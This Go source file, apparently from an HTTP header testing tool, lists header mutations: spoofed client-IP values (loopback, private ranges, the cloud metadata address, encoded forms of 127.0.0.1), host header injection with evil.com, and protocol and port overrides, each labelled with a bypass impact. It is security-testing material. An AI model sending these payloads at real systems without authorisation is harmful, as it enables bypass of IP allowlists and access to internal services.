package headers

import "github.com/cc1a2b/HHunter/engine"

func GetProxyMutations() []engine.Mutation {
	return []engine.Mutation{
		// X-Forwarded-For with various IPs
		{Header: "X-Forwarded-For", Value: "127.0.0.1", Category: "Proxy", Impact: "IP Whitelist Bypass - Loopback"},
		{Header: "X-Forwarded-For", Value: "::1", Category: "Proxy", Impact: "IP Whitelist Bypass - IPv6 Loopback"},
		{Header: "X-Forwarded-For", Value: "localhost", Category: "Proxy", Impact: "IP Whitelist Bypass - Localhost"},
		{Header: "X-Forwarded-For", Value: "0.0.0.0", Category: "Proxy", Impact: "IP Whitelist Bypass - Any Address"},
		{Header: "X-Forwarded-For", Value: "169.254.169.254", Category: "Proxy", Impact: "Cloud Metadata Access"},
		{Header: "X-Forwarded-For", Value: "10.0.0.1", Category: "Proxy", Impact: "Internal Network Access - 10.x"},
		{Header: "X-Forwarded-For", Value: "192.168.1.1", Category: "Proxy", Impact: "Internal Network Access - 192.168.x"},
		{Header: "X-Forwarded-For", Value: "172.16.0.1", Category: "Proxy", Impact: "Internal Network Access - 172.16.x"},
		{Header: "X-Forwarded-For", Value: "192.168.0.1", Category: "Proxy", Impact: "Internal Network Access - Gateway"},
		{Header: "X-Forwarded-For", Value: "10.0.0.0", Category: "Proxy", Impact: "Internal Network Access - Network"},
		{Header: "X-Forwarded-For", Value: "10.255.255.255", Category: "Proxy", Impact: "Internal Network Access - Broadcast"},

		// IP encoding bypass
		{Header: "X-Forwarded-For", Value: "0177.0.0.1", Category: "Proxy", Impact: "IP Bypass - Octal Encoding"},
		{Header: "X-Forwarded-For", Value: "0x7f000001", Category: "Proxy", Impact: "IP Bypass - Hex Encoding"},
		{Header: "X-Forwarded-For", Value: "2130706433", Category: "Proxy", Impact: "IP Bypass - Decimal Encoding"},
		{Header: "X-Forwarded-For", Value: "017700000001", Category: "Proxy", Impact: "IP Bypass - Full Octal"},
		{Header: "X-Forwarded-For", Value: "0x7f.0x0.0x0.0x1", Category: "Proxy", Impact: "IP Bypass - Dotted Hex"},
		{Header: "X-Forwarded-For", Value: "127.0.0.1:80", Category: "Proxy", Impact: "IP Bypass - With Port"},
		{Header: "X-Forwarded-For", Value: "127.1", Category: "Proxy", Impact: "IP Bypass - Shortened"},
		{Header: "X-Forwarded-For", Value: "127.0.1", Category: "Proxy", Impact: "IP Bypass - Three Octets"},
		{Header: "X-Forwarded-For", Value: "[::ffff:127.0.0.1]", Category: "Proxy", Impact: "IP Bypass - IPv6 Mapped"},
		{Header: "X-Forwarded-For", Value: "0000::1", Category: "Proxy", Impact: "IP Bypass - IPv6 Expanded"},
		{Header: "X-Forwarded-For", Value: "::ffff:7f00:1", Category: "Proxy", Impact: "IP Bypass - IPv6 Hex Mapped"},
		{Header: "X-Forwarded-For", Value: "127.0.0.1, 8.8.8.8", Category: "Proxy", Impact: "IP Bypass - XFF Chain"},
		{Header: "X-Forwarded-For", Value: "8.8.8.8, 127.0.0.1", Category: "Proxy", Impact: "IP Bypass - XFF Chain Reverse"},

		// X-Real-IP variants
		{Header: "X-Real-IP", Value: "127.0.0.1", Category: "Proxy", Impact: "IP Bypass via X-Real-IP"},
		{Header: "X-Real-IP", Value: "::1", Category: "Proxy", Impact: "IP Bypass via X-Real-IP IPv6"},
		{Header: "X-Real-IP", Value: "169.254.169.254", Category: "Proxy", Impact: "Metadata via X-Real-IP"},
		{Header: "X-Real-IP", Value: "10.0.0.1", Category: "Proxy", Impact: "Internal via X-Real-IP"},
		{Header: "X-Real-Ip", Value: "127.0.0.1", Category: "Proxy", Impact: "IP Bypass via X-Real-Ip (case)"},

		// Client-IP variants
		{Header: "X-Client-IP", Value: "127.0.0.1", Category: "Proxy", Impact: "IP Bypass via X-Client-IP"},
		{Header: "X-Client-IP", Value: "::1", Category: "Proxy", Impact: "IP Bypass via X-Client-IP IPv6"},
		{Header: "X-Client-IP", Value: "169.254.169.254", Category: "Proxy", Impact: "Metadata via X-Client-IP"},
		{Header: "Client-IP", Value: "127.0.0.1", Category: "Proxy", Impact: "IP Bypass via Client-IP"},
		{Header: "Client-IP", Value: "::1", Category: "Proxy", Impact: "IP Bypass via Client-IP IPv6"},

		// Less common IP headers
		{Header: "X-Originating-IP", Value: "127.0.0.1", Category: "Proxy", Impact: "IP Bypass via X-Originating-IP"},
		{Header: "X-Originating-IP", Value: "[127.0.0.1]", Category: "Proxy", Impact: "IP Bypass via X-Originating-IP Bracket"},
		{Header: "X-Remote-IP", Value: "127.0.0.1", Category: "Proxy", Impact: "IP Bypass via X-Remote-IP"},
		{Header: "X-Remote-Addr", Value: "127.0.0.1", Category: "Proxy", Impact: "IP Bypass via X-Remote-Addr"},
		{Header: "X-ProxyUser-Ip", Value: "127.0.0.1", Category: "Proxy", Impact: "IP Bypass via X-ProxyUser-Ip"},
		{Header: "True-Client-IP", Value: "127.0.0.1", Category: "Proxy", Impact: "IP Bypass via True-Client-IP"},
		{Header: "X-Cluster-Client-IP", Value: "127.0.0.1", Category: "Proxy", Impact: "IP Bypass via X-Cluster-Client-IP"},
		{Header: "X-Original-Forwarded-For", Value: "127.0.0.1", Category: "Proxy", Impact: "IP Bypass via X-Original-Forwarded-For"},
		{Header: "X-Real-Client-IP", Value: "127.0.0.1", Category: "Proxy", Impact: "IP Bypass via X-Real-Client-IP"},
		{Header: "Forwarded-For", Value: "127.0.0.1", Category: "Proxy", Impact: "IP Bypass via Forwarded-For"},
		{Header: "X-Forwarded", Value: "for=127.0.0.1", Category: "Proxy", Impact: "IP Bypass via X-Forwarded"},
		{Header: "X-Custom-IP-Authorization", Value: "127.0.0.1", Category: "Proxy", Impact: "IP Bypass via Custom IP Auth"},

		// RFC 7239 Forwarded header
		{Header: "Forwarded", Value: "for=127.0.0.1", Category: "Proxy", Impact: "IP Bypass via RFC7239"},
		{Header: "Forwarded", Value: "for=127.0.0.1;proto=https", Category: "Proxy", Impact: "IP + Proto Bypass"},
		{Header: "Forwarded", Value: "for=::1", Category: "Proxy", Impact: "IPv6 Bypass via RFC7239"},
		{Header: "Forwarded", Value: "for=\"[::1]\"", Category: "Proxy", Impact: "Quoted IPv6 via RFC7239"},
		{Header: "Forwarded", Value: "for=127.0.0.1;by=proxy", Category: "Proxy", Impact: "Proxy Chain via RFC7239"},
		{Header: "Forwarded", Value: "for=unknown", Category: "Proxy", Impact: "Unknown Client via RFC7239"},
		{Header: "Forwarded", Value: "for=_hidden", Category: "Proxy", Impact: "Hidden Client via RFC7239"},

		// Host header injection
		{Header: "X-Host", Value: "localhost", Category: "Proxy", Impact: "Host Injection - Localhost"},
		{Header: "X-Host", Value: "127.0.0.1", Category: "Proxy", Impact: "Host Injection - Loopback"},
		{Header: "X-Host", Value: "evil.com", Category: "Proxy", Impact: "Host Injection - Evil Domain"},
		{Header: "X-Forwarded-Host", Value: "localhost", Category: "Proxy", Impact: "Forwarded Host - Localhost"},
		{Header: "X-Forwarded-Host", Value: "evil.com", Category: "Proxy", Impact: "Forwarded Host - Evil Domain"},
		{Header: "X-Original-Host", Value: "localhost", Category: "Proxy", Impact: "Original Host - Localhost"},
		{Header: "X-Original-Host", Value: "evil.com", Category: "Proxy", Impact: "Original Host - Evil Domain"},
		{Header: "X-Forwarded-Server", Value: "localhost", Category: "Proxy", Impact: "Forwarded Server - Localhost"},
		{Header: "X-HTTP-Host-Override", Value: "evil.com", Category: "Proxy", Impact: "HTTP Host Override"},

		// Protocol confusion
		{Header: "X-Forwarded-Proto", Value: "https", Category: "Proxy", Impact: "Protocol Confusion - HTTPS"},
		{Header: "X-Forwarded-Proto", Value: "http", Category: "Proxy", Impact: "Protocol Downgrade - HTTP"},
		{Header: "X-Forwarded-Scheme", Value: "https", Category: "Proxy", Impact: "Scheme Confusion - HTTPS"},
		{Header: "X-Forwarded-Scheme", Value: "http", Category: "Proxy", Impact: "Scheme Downgrade - HTTP"},
		{Header: "X-Forwarded-Ssl", Value: "on", Category: "Proxy", Impact: "SSL Override - On"},
		{Header: "X-Forwarded-Ssl", Value: "off", Category: "Proxy", Impact: "SSL Override - Off"},
		{Header: "Front-End-Https", Value: "on", Category: "Proxy", Impact: "Frontend HTTPS - On"},
		{Header: "Front-End-Https", Value: "off", Category: "Proxy", Impact: "Frontend HTTPS - Off"},
		{Header: "X-Url-Scheme", Value: "https", Category: "Proxy", Impact: "URL Scheme Spoof - HTTPS"},
		{Header: "X-Url-Scheme", Value: "http", Category: "Proxy", Impact: "URL Scheme Spoof - HTTP"},

		// Port manipulation
		{Header: "X-Forwarded-Port", Value: "443", Category: "Proxy", Impact: "Port Override - 443"},
		{Header: "X-Forwarded-Port", Value: "80", Category: "Proxy", Impact: "Port Override - 80"},
		{Header: "X-Forwarded-Port", Value: "8080", Category: "Proxy", Impact: "Port Override - 8080"},
		{Header: "X-Forwarded-Port", Value: "4443", Category: "Proxy", Impact: "Port Override - 4443"},
	}
}
